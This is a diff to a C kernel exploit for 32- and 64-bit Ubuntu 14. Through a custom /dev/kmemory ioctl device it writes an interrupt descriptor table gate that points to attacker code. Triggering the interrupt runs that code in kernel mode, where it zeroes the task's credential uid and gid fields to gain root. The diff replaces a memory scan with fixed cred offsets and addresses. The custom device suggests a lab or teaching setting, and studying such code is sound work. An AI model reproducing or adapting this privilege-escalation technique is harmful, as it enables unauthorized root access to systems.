@@ -7,7 +7,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdbool.h>
-#include <sys/utsname.h>
+#include <stdint.h>
 
 #include "kmem_ioctl.h"
 
@@ -19,15 +19,15 @@
 #endif
 
 #if SYSTEM == UBUNTU14_32
-# define START_ADDR 0xC0000000
+# define IDT_ADDR 0xc1c7b000
+# define THREAD_SIZE 0x2000
+# define TASK_CRED_OFFSET 1020
 #elif SYSTEM == UBUNTU14_64
-# define START_ADDR 0xffff880000000000
+# define THREAD_SIZE 0x4000
+# define TASK_CRED_OFFSET 1536
 #endif
 
-
-static int THREAD_SIZE_MASK = (-4096);
-
-static uid_t uid = 0;
+static int THREAD_SIZE_MASK = ~(THREAD_SIZE - 1);
 
 struct idtr {
 	unsigned short limit;
@@ -46,20 +46,14 @@ struct idt {
 	(idt).off2 = addr >> 16;         \
 	(idt).sel = s;                   \
 	(idt).none = 0;                  \
-	(idt).flags = 0x8E | (ring << 5); 
+	(idt).flags = 0x8E | (ring << 5);
 
-void kernel(unsigned *task)
+void get_root_idt(void *task)
 {
-	unsigned *addr = task;
+	int *cred = *((unsigned long *)(task + TASK_CRED_OFFSET));
 
-	while (addr[0] != uid ||
-               addr[1] != uid ||
-	       addr[2] != uid ||
-               addr[3] != uid)
-		addr++;
-
-        addr[0] = addr[1] = addr[2] = addr[3] = 0; /* set uids */
-        addr[4] = addr[5] = addr[6] = addr[7] = 0; /* set gids */
+        cred[0] = cred[1] = cred[2] = cred[3] = 0; /* set uids */
+        cred[4] = cred[5] = cred[6] = cred[7] = 0; /* set gids */
 }
 
 void kcode(void);
@@ -78,7 +72,7 @@ void __kcode(void)
 	asm(
 	"andl %esp,%eax \n"
 	"pushl (%eax) \n"
-	"call kernel \n"
+	"call get_root_idt \n"
 	"addl $4, %esp \n"
 	"popl %ds \n"
 	"popl %es \n"
@@ -117,9 +111,7 @@ int cat(const char *fname)
 int main(int argc, char *argv[])
 {
 	int fd, rc;
-	struct idt *idt = (struct idt *) 0xc1c7b000;
-
-	uid = getuid();
+	struct idt *idt = (struct idt *) IDT_ADDR;
 
 	fd = open("/dev/kmemory", O_RDONLY);
 	if (fd < 0) {
@@ -139,7 +131,7 @@ int main(int argc, char *argv[])
 	SET_IDT_GATE(idtvec, 3, 0x60, ((unsigned long) &kcode));
 	rc = ioctl(fd, KMEM_IOCTL_WRITE, &mem);
 
-	asm ("int $0xdd");
+	asm volatile ("int $0xdd");
 
         if (getuid() == 0) {
                 printf("[+] Got root!\n");
